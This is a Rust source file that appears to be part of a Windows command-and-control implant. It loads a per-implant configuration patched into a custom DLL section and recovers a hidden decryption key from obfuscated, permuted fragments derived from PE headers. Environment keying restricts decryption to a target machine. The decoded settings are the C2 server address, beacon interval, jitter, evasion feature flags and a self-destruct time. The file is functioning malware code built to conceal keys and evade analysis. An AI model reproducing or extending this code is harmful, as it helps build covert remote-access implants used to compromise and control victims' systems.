//! Runtime config loader from the `.nyx_cfg` PE section.
//!
//! The build-time DLL template carries a 1024-byte `.nyx_cfg` section filled
//! with `0xAA` (magic `0x41414141` = unpatched). At implant-generation time the
//! server patches this section with the per-implant config:
//!
//! ```text
//! [0xDEADBEEF magic (4B LE)]
//! [keying_levels    (4B LE)]  -- env-keying bitmap (0 = disabled)
//! [config_data_len  (2B LE)]  -- ct + tag bytes (N+16)
//! [config_nonce     (12B)]
//! [fragment slots   (32B)]    -- 4 × 8B scattered, permuted, XOR-obfuscated
//!                                 key_seed fragments (HKDF-Chain Key Concealment)
//! [encrypted_config (N B)]    -- ChaCha20-Poly1305 AEAD
//! [poly1305_tag     (16B)]
//! [padding to 1024B]
//! ```
//!
//! ## Key recovery (HKDF-Chain Key Concealment)
//!
//! The implant's X25519 private key is NEVER stored. Instead, a 32-byte key_seed
//! is split into 4 fragments, each XOR-obfuscated with a different PE-region-
//! derived mask, and stored in permuted order. Recovery:
//!
//! 1. Derive 4 XOR masks from 4 non-overlapping 1024-byte PE header regions
//! 2. Compute fragment permutation from djb2(entry_point_bytes[0..16])
//! 3. Read 4 fragments from permuted slots, un-XOR with each mask
//! 4. Assemble key_seed in logical order
//! 5. implant_priv = HKDF-SHA256(key_seed, "nyx-implant-key-v1", server_pub)
//!    with X25519 clamping
//! 6. config_key = ECDH(implant_priv, server_pub) + HKDF (as before)
//!
//! If the section is unpatched (magic `0x41414141`), we fall back to the
//! compile-time config baked by `build.rs` — the dev/CI path.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use nyx_protocol::wire::{Reader, WireError};

/// Returns (module_base, .nyx_cfg_section_ptr), or None if the section is not found.
fn nyx_cfg_ptr() -> Option<(*const u8, *const u8)> {
    extern "C" {
        static __ImageBase: u8;
    }
    let base = unsafe { &__ImageBase as *const u8 };

    let dos_header = base;
    let pe_offset = unsafe { *(dos_header.add(0x3C) as *const i32) } as isize;
    if pe_offset <= 0 {
        return None;
    }
    let pe_header = unsafe { base.offset(pe_offset) };
    let coff = unsafe { pe_header.add(4) };
    let num_sections = unsafe { *(coff.add(2) as *const u16) } as usize;
    let opt_header_size = unsafe { *(coff.add(16) as *const u16) } as isize;
    let sections = unsafe { coff.add(20).offset(opt_header_size) };
    const SECTION_HEADER_SIZE: isize = 40;

    for i in 0..num_sections {
        let sh = unsafe { sections.offset(i as isize * SECTION_HEADER_SIZE) };
        let name = unsafe { core::slice::from_raw_parts(sh, 8) };
        if &name[..7] == b".nyx_cf" && name[7] == b'g' {
            let rva = unsafe { *(sh.add(12) as *const u32) } as isize;
            return Some((base, unsafe { base.offset(rva) }));
        }
    }
    None
}

// ══════════════════════════════════════════════════════════════════════════════
// HKDF-Chain Key Concealment helpers
// ══════════════════════════════════════════════════════════════════════════════
//
// All functions in this section that derive mask/permutation/seed material
// MUST be byte-for-byte identical to their mirror copies in
// `crates/server/src/implant_gen.rs`. Any divergence breaks key recovery at
// runtime (AEAD tag mismatch → silent fallback to compile-time config). The
// input *window* is also mirrored: both sides read only the PE headers region
// `0..SizeOfHeaders`, which is byte-identical on disk (file layout) and in
// memory (mapped layout) — PE headers carry no fixups, so the two layouts
// agree there.

/// Derive an 8-byte XOR mask from the PE headers region, distinguished per
/// fragment by the `region` index.
///
/// All 4 fragments observe the *same* byte window (`data`, the full
/// `0..SizeOfHeaders` slice); the `region` value mixes into the hash so each
/// fragment still gets a distinct 8-byte mask. This avoids the earlier
/// 1024-byte-window split that crossed into file/memory-divergent territory.
fn derive_fragment_mask(data: &[u8], region: u8) -> [u8; 8] {
    let mut mask = [0u8; 8];
    // Seed the state with the region so each fragment's mask diverges even
    // before any input bytes are consumed. The seed values are spread across
    // the 8 lanes so no two regions produce the same starting state.
    mask[0] = region.wrapping_mul(0x9E).wrapping_add(0x5A);
    mask[1] = region.wrapping_mul(0x37).wrapping_add(0xA5);
    mask[2] = region.rotate_left(3).wrapping_add(0x3C);
    mask[3] = region.rotate_left(5) ^ 0xC3;
    mask[4] = region.wrapping_mul(region).wrapping_add(0x5A);
    mask[5] = region ^ (region.wrapping_mul(0x1F));
    mask[6] = region.rotate_left(2).wrapping_add(0x96);
    mask[7] = region.wrapping_mul(0x6A) ^ 0x69;
    for (j, &b) in data.iter().enumerate() {
        mask[j % 8] = mask[j % 8].wrapping_mul(31).wrapping_add(b);
        mask[(j.wrapping_mul(5).wrapping_add(3)) % 8] ^= b.rotate_left((j % 7) as u32);
    }
    // Second pass: avalanche — each byte absorbs its neighbours
    for _ in 0..4 {
        for i in 0..8 {
            mask[i] = mask[i].wrapping_add(mask[(i + 3) % 8]).rotate_left(3);
        }
    }
    mask
}

/// Fisher-Yates shuffle seeded by an LCG PRNG to produce a deterministic
/// permutation of [0, 1, 2, 3] from a 32-bit seed.
///
/// The permutation determines which fragment slot stores which fragment.
fn derive_permutation(seed: u32) -> [u8; 4] {
    let mut order = [0u8, 1u8, 2u8, 3u8];
    let mut state = seed;
    // Fisher-Yates with LCG: state = state * 1103515245 + 12345
    for i in (1..4).rev() {
        state = state.wrapping_mul(1103515245).wrapping_add(12345);
        let j = (state >> 16) as usize % (i + 1);
        order.swap(i, j);
    }
    order
}

/// djb2 hash over raw bytes (no case-folding — used for binary data like
/// entry point machine code, not strings).
fn djb2_raw(data: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in data {
        h = h.wrapping_mul(33).wrapping_add(b as u32);
    }
    h
}

/// Apply X25519 scalar clamping to a 32-byte key.
/// - Clear the low 3 bits of byte 0
/// - Clear the high bit of byte 31
/// - Set the penultimate bit of byte 31
fn clamp_scalar(mut s: [u8; 32]) -> [u8; 32] {
    s[0] &= 0xF8;
    s[31] &= 0x7F;
    s[31] |= 0x40;
    s
}

/// Read the entry point RVA from the running PE image's optional header.
/// Returns 0 if the header is unparseable.
fn get_entry_point_rva(base: *const u8) -> u32 {
    let pe_offset = unsafe { *(base.add(0x3C) as *const i32) } as isize;
    if pe_offset <= 0 {
        return 0;
    }
    // COFF header = pe_header + 4, optional header = coff + 20
    // Entry point RVA = optional header offset 16 (u32 LE)
    let opt_header = unsafe { base.offset(pe_offset).add(4).add(20) };
    unsafe { *(opt_header.add(16) as *const u32) }
}

/// Read the PE `SizeOfHeaders` field (Optional Header +0x3C, u32 LE; same
/// offset for PE32 and PE32+). This is the byte-identical-on-disk-and-in-
/// memory region used for mask derivation. Returns 0 if unparseable.
///
/// **MUST match the server-side copy EXACTLY.**
fn get_size_of_headers(base: *const u8) -> u32 {
    let pe_offset = unsafe { *(base.add(0x3C) as *const i32) } as isize;
    if pe_offset <= 0 {
        return 0;
    }
    // Optional Header = PE sig + 4 (COFF) + 20. SizeOfHeaders at opt +0x3C.
    let opt_header = unsafe { base.offset(pe_offset).add(4).add(20) };
    unsafe { *(opt_header.add(0x3C) as *const u32) }
}

/// Read the PE `SizeOfImage` field (Optional Header +0x38, u32 LE; same
/// offset for PE32 and PE32+). Used as the upper bound for runtime RVA
/// bounds-checking. Returns 0 if unparseable.
fn get_size_of_image(base: *const u8) -> u32 {
    let pe_offset = unsafe { *(base.add(0x3C) as *const i32) } as isize;
    if pe_offset <= 0 {
        return 0;
    }
    let opt_header = unsafe { base.offset(pe_offset).add(4).add(20) };
    unsafe { *(opt_header.add(0x38) as *const u32) }
}

// ══════════════════════════════════════════════════════════════════════════════
// Config types
// ══════════════════════════════════════════════════════════════════════════════

/// Extra fields that may come from a per-implant (patched) config.
/// All fields are optional — compile-time builds have them all as `None`/`0`.
#[derive(Debug, Clone)]
pub struct ImplantConfig {
    /// One-time auth token (32 bytes) for first check-in validation.
    pub auth_token: Option<[u8; 32]>,
    /// Per-implant X25519 keypair (replaces per-session ephemeral generation).
    /// When set, the beacon loop uses this keypair instead of calling
    /// `ImplantKeypair::generate()`.
    pub implant_priv: Option<[u8; 32]>,
    /// Features bitmap (foliage, module_stomp, hwbp_blind, etc.).
    pub features_bitmap: u32,
    /// Number of environment keying HKDF layers (0 = disabled).
    pub keying_levels: u32,
    /// Unix timestamp after which the implant self-terminates (0 = no expiry).
    pub expires_at: u64,
}

impl Default for ImplantConfig {
    fn default() -> Self {
        Self {
            auth_token: None,
            implant_priv: None,
            features_bitmap: 0,
            keying_levels: 0,
            expires_at: 0,
        }
    }
}

/// Load the runtime config.
///
/// 1. Check if the `.nyx_cfg` section has been patched (magic `0xDEADBEEF`).
///    If so, derive the per-implant config key via ECDH+HKDF, decrypt the
///    config blob, decode the fields, and return them.
/// 2. If not patched (magic `0x41414141` or section missing), fall back to
///    the compile-time `config::load()`.
///
/// Returns `(Config, ImplantConfig, plaintext_bytes)`.
/// The caller MUST register the plaintext bytes with `mem::register_owned` to
/// keep them in maskable memory.
pub fn load_runtime_config(
) -> Option<(crate::config::Config, ImplantConfig, Vec<u8>)> {
    let (base, ptr) = nyx_cfg_ptr()?;
    let section = unsafe { core::slice::from_raw_parts(ptr, 1024) };

    // Read magic (4 bytes LE)
    let magic = u32::from_le_bytes([section[0], section[1], section[2], section[3]]);

    if magic == 0x41414141 {
        // Unpatched — fall back to compile-time config.
        return None;
    }

    if magic != 0xDEADBEEF {
        // Unknown magic — corrupt or hand-modified binary. Fall back.
        return None;
    }

    // Patched. Read env-keying bitmap (u32 LE at bytes 4-7).
    let keying_levels = u32::from_le_bytes([section[4], section[5], section[6], section[7]]);

    // Read config data length (u16 LE at bytes 8-9).
    let data_len = u16::from_le_bytes([section[8], section[9]]) as usize;
    if data_len == 0 || data_len > 900 {
        // Sanity: config data can't be empty or improbably large.
        return None;
    }

    // Read config nonce (12B at bytes 10-21).
    let config_nonce: [u8; 12] = section[10..22].try_into().ok()?;

    // ── HKDF-Chain Key Concealment: recover key_seed from fragments ──────────
    //
    // The server splits the 32B key_seed into 4 fragments, XOR-obfuscates each
    // with a different mask derived from the PE headers region, and stores
    // them in permuted order. We reverse this to recover the seed, then derive
    // the actual X25519 private key via HKDF.

    // 1. Read only the PE headers region (`0..SizeOfHeaders`). This range is
    //    byte-identical on disk and in our memory map (PE headers carry no
    //    fixups), so it matches what the server used at generation time.
    //    Reading beyond SizeOfHeaders would diverge (file layout has section
    //    raw data where memory has zero-fill).
    let soh = {
        let v = get_size_of_headers(base) as usize;
        // Clamp to a sane upper bound so a corrupt SizeOfHeaders can't make
        // us slice out of the mapped image. 4096 is generous; real DLLs are
        // typically 0x200–0x800.
        v.min(4096)
    };
    let header = if soh > 0 {
        unsafe { core::slice::from_raw_parts(base, soh) }
    } else {
        // SizeOfHeaders unparseable — server side hits the same condition and
        // derives masks from an empty slice (region seed alone determines
        // the mask). Both sides stay in lockstep.
        &[]
    };
    let masks: [[u8; 8]; 4] = [
        derive_fragment_mask(header, 0),
        derive_fragment_mask(header, 1),
        derive_fragment_mask(header, 2),
        derive_fragment_mask(header, 3),
    ];

    // 2. Compute fragment permutation from entry point bytes.
    //
    // Bounds-check against SizeOfImage before dereferencing base+entry_rva —
    // a corrupt/abnormal RVA must not cause an out-of-mapping read. When the
    // RVA is invalid or unreadable, fall back to hashing the same header
    // window used for mask derivation (so both fallback paths use the
    // identical byte slice the server would use).
    let entry_rva = get_entry_point_rva(base);
    let size_of_image = get_size_of_image(base) as usize;
    let order_seed = if entry_rva != 0
        && size_of_image != 0
        && (entry_rva as usize) + 16 <= size_of_image
    {
        let ep_bytes =
            unsafe { core::slice::from_raw_parts(base.add(entry_rva as usize), 16) };
        djb2_raw(ep_bytes)
    } else {
        // Fallback: hash the same header window (matches server fallback).
        djb2_raw(header)
    };
    let frag_order = derive_permutation(order_seed);

    // 3. Read 4 fragments from scattered positions, un-XOR, and assemble.
    //
    // The server stores fragment `frag_order[slot]` at position 22+slot*8,
    // XOR-obfuscated with mask[frag_order[slot]]. We read each slot, un-XOR
    // with the correct mask, and place the fragment at its logical position
    // in key_seed.
    let mut key_seed = [0u8; 32];
    for slot in 0..4usize {
        let frag_idx = frag_order[slot] as usize;
        let pos = 22 + slot * 8;
        if pos + 8 > 1024 {
            return None;
        }
        let mut fragment = [0u8; 8];
        fragment.copy_from_slice(&section[pos..pos + 8]);
        // Un-XOR with the fragment's mask.
        for j in 0..8 {
            fragment[j] ^= masks[frag_idx][j];
        }
        key_seed[frag_idx * 8..frag_idx * 8 + 8].copy_from_slice(&fragment);
    }

    // 4. Derive implant_priv = HKDF-SHA256(key_seed, "nyx-implant-key-v1",
    //    server_pub) with X25519 clamping.
    let server_pub = crate::server_pub::SERVER_PUB;
    let mut derived_priv = [0u8; 32];
    nyx_protocol::crypto::hkdf_sha256(
        &key_seed,
        b"nyx-implant-key-v1",
        &server_pub,
        &mut derived_priv,
    );
    let implant_priv = clamp_scalar(derived_priv);
    // Zero intermediates.
    for b in derived_priv.iter_mut() {
        *b = 0;
    }
    for b in key_seed.iter_mut() {
        *b = 0;
    }

    // ── End HKDF-Chain Key Concealment ───────────────────────────────────────

    // Read encrypted config + tag (bytes 54..54+data_len).
    if 54 + data_len > 1024 {
        return None;
    }
    let ct_with_tag = &section[54..54 + data_len];

    // Derive config_key via ECDH(implant_priv, server_pub) + HKDF-SHA256.
    let mut config_key = derive_config_key(&implant_priv, &server_pub)?;

    // Apply environment keying layers BEFORE decryption so the AEAD tag
    // check enforces the target environment.  If keying_levels is 0 this is
    // a no-op; otherwise each active layer mixes HKDF-SHA256 over the current
    // key and the environment-specific data.  Missing env data (PEB walk
    // failure) skips that layer gracefully.
    if keying_levels != 0 {
        crate::env_keying::apply_layers(&mut config_key, keying_levels);
    }

    // Decrypt with ChaCha20-Poly1305.
    let plaintext = decrypt_config(&config_key, &config_nonce, ct_with_tag)?;

    // The plaintext contains: [server_host str][server_port u16][beacon_uri str]
    //   [sleep_seconds u32][jitter_pct u8][use_tls u8]
    //   [auth_token presence(0/1) + optional 32B]
    //   [features_bitmap u32][keying_levels u32][expires_at u64]
    let mut r = Reader::new(&plaintext);
    let server_host = r.str().ok()?;
    let server_port = r.u16().ok()?;
    let beacon_uri = r.str().ok()?;
    let sleep_seconds = r.u32().ok()?;
    let jitter_pct = r.u8().ok()?;
    let use_tls = r.u8().ok()? != 0;

    // Auth token: presence byte + optional 32B
    let auth_token = if r.remaining() > 0 {
        let has_token = r.u8().ok()?;
        if has_token == 1 {
            let b = r.blob().ok()?;
            if b.len() != 32 {
                return None;
            }
            let mut token = [0u8; 32];
            token.copy_from_slice(b);
            Some(token)
        } else {
            None
        }
    } else {
        None
    };

    let features_bitmap = r.u32().ok().unwrap_or(0);
    // keying_levels is read from the section header (unencrypted) above and is
    // authoritative.  The plaintext copy is consumed for backward compat with
    // older server builds that still embed it, but we discard the value.
    let _keying_levels_plain = r.u32().ok().unwrap_or(0);
    let expires_at = r.u64().ok().unwrap_or(0);

    let cfg = crate::config::Config {
        server_host,
        server_port,
        beacon_uri,
        server_pub,
        sleep_seconds,
        jitter_pct,
        use_tls,
    };

    let implant = ImplantConfig {
        auth_token,
        implant_priv: Some(implant_priv),
        features_bitmap,
        keying_levels,
        expires_at,
    };

    Some((cfg, implant, plaintext))
}

// ══════════════════════════════════════════════════════════════════════════════
// .nyx_cfg section — placeholder for server-side per-implant patching
// ══════════════════════════════════════════════════════════════════════════════
//
// This static materializes the `.nyx_cfg` PE section in the compiled DLL
// template. `nyx_cfg_ptr()` above locates it at runtime by walking the section
// table; the server's `generate_implant` finds it by scanning for the
// `0x41414141` magic + `0xAA` padding, then overwrites the section in-place
// with the per-implant HKC blob (`0xDEADBEEF` magic + fragments + ciphertext).
//
// Layout (template / unpatched state):
//   bytes 0-3:    0x41414141 (magic — "not yet patched")
//   bytes 4-1023: 0xAA       (sentinel padding — lets the server confirm it
//                             found the right 1024-byte window)
//
// `#[used]` prevents the linker from discarding the symbol as unreferenced
// (no Rust code reads it directly — `nyx_cfg_ptr()` resolves it via the PE
// section table, not by symbol name). `#[link_section]` places it in a
// dedicated PE section so the server can locate and patch a contiguous
// 1024-byte region without colliding with `.rdata` or `.text`.

#[used]
#[link_section = ".nyx_cfg"]
#[no_mangle]
pub static NYX_CFG_PLACEHOLDER: [u8; 1024] = {
    let mut buf = [0xAAu8; 1024];
    buf[0] = 0x41;
    buf[1] = 0x41;
    buf[2] = 0x41;
    buf[3] = 0x41;
    buf
};

/// Derive the per-implant config encryption key:
///   shared = X25519_ECDH(implant_priv, server_pub)
///   config_key = HKDF-SHA256(shared, "nyx-implant-config-v1",
///                            server_pub || implant_pub)
fn derive_config_key(implant_priv: &[u8; 32], server_pub: &[u8; 32]) -> Option<[u8; 32]> {
    use nyx_protocol::crypto;

    // Compute implant public key from private key
    let implant_pub = crypto::public_from_secret(implant_priv)?;

    // ECDH: implant_priv × server_pub → shared secret
    let shared = crypto::ecdh(implant_priv, server_pub)?;

    // HKDF-SHA256: info = server_pub || implant_pub
    let mut info = [0u8; 64];
    info[..32].copy_from_slice(server_pub);
    info[32..].copy_from_slice(&implant_pub);

    let mut okm = [0u8; 32];
    crypto::hkdf_sha256(&shared, b"nyx-implant-config-v1", &info, &mut okm);
    Some(okm)
}

/// ChaCha20-Poly1305 decrypt `ct_with_tag` (ciphertext || 16B tag) under
/// `key` and `nonce`. Returns the plaintext on success (AEAD tag verified),
/// or `None` on failure.
fn decrypt_config(key: &[u8; 32], nonce: &[u8; 12], ct_with_tag: &[u8]) -> Option<Vec<u8>> {
    if ct_with_tag.len() < 17 {
        return None; // too short for tag
    }
    // We need ChaCha20-Poly1305. The nyx-config crate has `decrypt`, but it
    // requires CONFIG_KEY, CONFIG_NONCE, CONFIG_CT as statics. We have runtime
    // values. Use the protocol crate's crypto primitives directly.
    //
    // The simplest approach: use chacha20poly1305 crate directly.
    // But we're in no_std. The nyx-config crate uses chacha20poly1305 with the
    // `aead` trait. Let's check if that's available.
    //
    // Actually, we can use the crypto::decrypt_config function that we'll add
    // to the protocol crate. For now, delegate to the crypto module.
    nyx_protocol::crypto::aead_decrypt(key, nonce, ct_with_tag)
}
